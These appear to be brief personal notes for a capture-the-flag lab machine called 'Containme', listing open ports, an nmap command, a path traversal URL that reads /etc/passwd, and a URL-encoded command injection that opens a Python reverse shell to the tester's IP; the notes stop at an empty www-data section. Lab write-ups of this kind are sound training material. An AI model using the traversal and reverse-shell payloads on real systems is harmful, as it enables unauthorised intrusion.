# Containme 

> VOiD | Saturday 13 November 2021 12:56:46 AM IST

My IP : 10.8.253.221
Target IP : 10.10.160.17

```bash
PORT     STATE SERVICE      REASON
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
2222/tcp open  EtherNetIP-1 syn-ack
8022/tcp open  oa-system    syn-ack


nmap -n -sV --script enip-info -p 2222 10.10.160.17

http://10.10.160.17/index.php
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	
<!--  where is the path ?  -->


http://10.10.160.17/info.php

http://10.10.160.17/index.php?path=./../../../../etc/passwd


For reverse shell

http://10.10.160.17/index.php?path=./../../../../;python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.8.253.221%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([%22/bin/sh%22,%22-i%22])%27


```


## USER [www-data]
```bash


```